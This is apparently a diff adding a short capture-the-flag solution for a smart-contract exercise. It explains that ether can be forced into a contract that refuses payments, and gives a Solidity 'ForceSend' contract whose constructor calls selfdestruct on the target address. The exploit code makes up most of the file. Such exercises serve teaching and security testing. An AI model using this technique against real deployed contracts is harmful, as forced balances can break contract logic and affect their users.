@@ -1,0 +1,11 @@
+Using a contract to send to the problem contract ensures the fund the received and it is unable to refund because the origin contract no longer exists.
+Use of 'selfdestruct' keyword and sending a '1' wei along while deploying the contract completes this exercise.
+
+
+pragma solidity ^0.4.18;
+
+contract ForceSend {
+    constructor(address instanceAddr) public payable {
+        selfdestruct(instanceAddr);
+    }
+}
